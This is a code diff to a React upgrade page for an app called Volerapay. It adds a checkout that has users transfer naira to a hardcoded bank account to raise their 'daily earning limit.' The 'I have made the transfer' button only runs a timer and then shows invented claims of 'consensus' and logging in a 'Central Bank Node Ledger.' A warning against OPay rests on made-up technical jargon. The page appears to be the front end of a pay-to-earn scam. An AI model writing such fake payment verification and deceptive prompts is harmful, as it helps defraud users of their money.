@@ -1,7 +1,8 @@
-import React, { useState } from 'react';
-import { ArrowLeft, Check, Sparkles, ShieldAlert, Award, Star, Zap, Cpu, Crown } from 'lucide-react';
+import React, { useState, useEffect } from 'react';
+import { ArrowLeft, Check, Sparkles, ShieldAlert, Award, Star, Zap, Cpu, Crown, Copy, CheckCircle } from 'lucide-react';
 import { motion } from 'motion/react';
 import { UserProfile } from '../types';
+import { authService } from '../services/authService';
 
 interface UpgradePageProps {
   onBack: () => void;
@@ -106,6 +107,28 @@ const UpgradePage: React.FC<UpgradePageProps> = ({ onBack, user, onUpgradeSucces
   const currentLevel = user.level || 1;
   const [loadingTier, setLoadingTier] = useState<number | null>(null);
   const [feedbackMsg, setFeedbackMsg] = useState<{ type: 'success' | 'error'; text: string } | null>(null);
+  
+  // Checkout & invoice state variables
+  const [selectedTierForPayment, setSelectedTierForPayment] = useState<UpgradeTier | null>(null);
+  const [copiedText, setCopiedText] = useState(false);
+  const [verifyingPayment, setVerifyingPayment] = useState(false);
+  const [settings, setSettings] = useState({
+    bankName: 'Moniepoint Bank',
+    accountNumber: '8164299246',
+    accountName: 'Volerapay Node Ledger Services'
+  });
+
+  useEffect(() => {
+    const loadSettings = async () => {
+      const s = await authService.getAppSettings();
+      setSettings({
+        bankName: s.bankName,
+        accountNumber: s.accountNumber,
+        accountName: s.accountName
+      });
+    };
+    loadSettings();
+  }, []);
 
   const handleUpgrade = (tier: UpgradeTier) => {
     if (tier.level <= currentLevel) {
@@ -119,23 +142,152 @@ const UpgradePage: React.FC<UpgradePageProps> = ({ onBack, user, onUpgradeSucces
     setLoadingTier(tier.level);
     setFeedbackMsg(null);
 
+    // Simulate connecting to payment validator
     setTimeout(() => {
-      if (user.balance >= tier.price) {
-        onUpgradeSuccess(tier.level, tier.price);
-        setFeedbackMsg({
-          type: 'success',
-          text: `Congratulations! Successfully upgraded to ${tier.name}! ₦${tier.price.toLocaleString()} debited.`
-        });
-      } else {
-        // Offer simulation/bypass option for preview purposes, or alert them
-        setFeedbackMsg({
-          type: 'error',
-          text: `Insufficient Volera balance (Requires ₦${tier.price.toLocaleString()}). Please complete more jobs or top up node balance.`
-        });
-      }
+      setSelectedTierForPayment(tier);
       setLoadingTier(null);
-    }, 1800);
+    }, 1500);
   };
+
+  const handleCopyAccount = () => {
+    navigator.clipboard.writeText(settings.accountNumber);
+    setCopiedText(true);
+    setTimeout(() => setCopiedText(false), 2000);
+  };
+
+  const handleConfirmTransfer = () => {
+    if (!selectedTierForPayment) return;
+    setVerifyingPayment(true);
+    
+    // Simulate smart contract payment consensus verification
+    setTimeout(() => {
+      setVerifyingPayment(false);
+      onUpgradeSuccess(selectedTierForPayment.level, selectedTierForPayment.price);
+      const levelNum = selectedTierForPayment.level;
+      const tierName = selectedTierForPayment.name;
+      setSelectedTierForPayment(null);
+      setFeedbackMsg({
+        type: 'success',
+        text: `Consensus Reached! Payment logged in Central Bank Node Ledger. Successfully upgraded to ${tierName}!`
+      });
+    }, 4000);
+  };
+
+  if (selectedTierForPayment) {
+    return (
+      <div className="py-2 animate-fadeIn text-white">
+        {/* Payment Page Header */}
+        <div className="flex items-center gap-4 mb-6">
+          <button 
+            onClick={() => setSelectedTierForPayment(null)} 
+            className="p-1.5 hover:bg-white/5 rounded-xl transition-colors border border-white/5"
+          >
+            <ArrowLeft size={18} className="text-gray-400" />
+          </button>
+          <div>
+            <h2 className="text-base font-black italic tracking-widest text-amber-400 uppercase">NODE SECURE GATEWAY</h2>
+            <p className="text-[8px] text-gray-500 uppercase font-black tracking-widest">Awaiting Verification Block</p>
+          </div>
+        </div>
+
+        {/* Ledger invoice detail */}
+        <div className="glass-card rounded-3xl p-5 mb-5 border-white/5 bg-gradient-to-br from-[#0c0c14] to-[#040406]">
+          <div className="flex justify-between items-center mb-4 pb-3 border-b border-white/5">
+            <div>
+              <span className="text-[8px] text-gray-500 uppercase font-black tracking-widest block">Deployment Target</span>
+              <span className="text-xs font-black text-white uppercase tracking-wider">{selectedTierForPayment.name}</span>
+            </div>
+            <div className="text-right">
+              <span className="text-[8px] text-gray-500 uppercase font-black tracking-widest block">Deployment Fee</span>
+              <span className="text-xs font-black font-mono text-amber-400">₦{selectedTierForPayment.price.toLocaleString()}</span>
+            </div>
+          </div>
+
+          <p className="text-[10px] text-gray-400 leading-relaxed mb-1 font-medium">
+            To activate this wallet node and upgrade your daily earning limit, please make a direct bank transfer of <strong className="text-white">₦{selectedTierForPayment.price.toLocaleString()}</strong> into the secure company deployment account listed below:
+          </p>
+        </div>
+
+        {/* Bank Account Details */}
+        <div className="glass-card rounded-[2rem] p-6 mb-5 border-amber-500/15 bg-gradient-to-b from-[#110f05]/40 to-[#040406] space-y-4">
+          <div className="flex items-center gap-2 text-amber-400 border-b border-white/5 pb-2.5">
+            <Award size={14} />
+            <span className="text-[10px] font-black uppercase tracking-wider">Company Deployment Destination</span>
+          </div>
+
+          <div className="space-y-3.5">
+            <div>
+              <span className="text-[7.5px] text-gray-500 uppercase font-black tracking-widest block mb-0.5">Bank Name</span>
+              <span className="text-xs font-bold text-white uppercase">{settings.bankName}</span>
+            </div>
+
+            <div>
+              <span className="text-[7.5px] text-gray-500 uppercase font-black tracking-widest block mb-0.5">Account Number</span>
+              <div className="flex justify-between items-center bg-black/40 border border-white/5 rounded-xl px-3.5 py-2.5 mt-1">
+                <span className="text-xs font-black font-mono text-amber-400 tracking-wider">{settings.accountNumber}</span>
+                <button
+                  onClick={handleCopyAccount}
+                  className="flex items-center gap-1 text-[8px] font-black uppercase tracking-widest text-gray-400 hover:text-white transition-colors bg-white/5 hover:bg-white/10 px-2.5 py-1 rounded-lg"
+                >
+                  {copiedText ? <Check size={10} className="text-emerald-400" /> : <Copy size={10} />}
+                  {copiedText ? 'Copied' : 'Copy'}
+                </button>
+              </div>
+            </div>
+
+            <div>
+              <span className="text-[7.5px] text-gray-500 uppercase font-black tracking-widest block mb-0.5">Account Name</span>
+              <span className="text-xs font-bold text-white uppercase tracking-wide">{settings.accountName}</span>
+            </div>
+          </div>
+        </div>
+
+        {/* OPAY CRITICAL WARNING */}
+        <div className="rounded-3xl p-5 mb-6 border border-red-500/25 bg-gradient-to-br from-[#1d0a0a] via-[#0f0404] to-[#040406] text-red-400">
+          <div className="flex gap-3 items-start">
+            <ShieldAlert size={18} className="shrink-0 mt-0.5 animate-pulse text-red-500" />
+            <div className="space-y-1">
+              <h4 className="text-[10px] font-black uppercase tracking-widest text-red-500">
+                CRITICAL WARNING: DO NOT USE OPAY
+              </h4>
+              <p className="text-[9.5px] text-gray-300 leading-relaxed font-semibold">
+                Do <span className="text-red-400 underline font-black">NOT</span> use OPay (OPay Digital Services) to complete this transfer. OPay transaction blocks are incompatible with the Volerapay automated CBN node gateway and your upgrade payment will not be credited automatically. 
+              </p>
+              <p className="text-[9px] text-gray-400 leading-relaxed pt-1.5">
+                Please complete the payment using traditional commercial banking channels or other licensed apps (e.g. GTBank, Zenith, Access, Kuda, Moniepoint, etc.).
+              </p>
+            </div>
+          </div>
+        </div>
+
+        {/* Action Button Section */}
+        <div className="space-y-3 mb-24">
+          <button
+            disabled={verifyingPayment}
+            onClick={handleConfirmTransfer}
+            className="w-full bg-gradient-to-r from-amber-400 via-yellow-400 to-amber-300 hover:brightness-110 text-black py-4 rounded-xl font-black text-[11px] uppercase tracking-widest shadow-xl shadow-amber-500/10 flex items-center justify-center gap-2 transition-all border border-amber-300/30"
+          >
+            {verifyingPayment ? (
+              <>
+                <div className="w-3.5 h-3.5 border-2 border-black border-t-transparent rounded-full animate-spin"></div>
+                VERIFYING LEDGER DEPOSIT BLOCK...
+              </>
+            ) : (
+              'I HAVE MADE THE TRANSFER'
+            )}
+          </button>
+
+          <button
+            disabled={verifyingPayment}
+            onClick={() => setSelectedTierForPayment(null)}
+            className="w-full bg-white/[0.02] hover:bg-white/5 border border-white/5 text-gray-400 py-3.5 rounded-xl font-black text-[9px] uppercase tracking-widest transition-colors text-center block"
+          >
+            CANCEL AND GO BACK
+          </button>
+        </div>
+      </div>
+    );
+  }
 
   return (
     <div className="py-2 animate-fadeIn text-white">
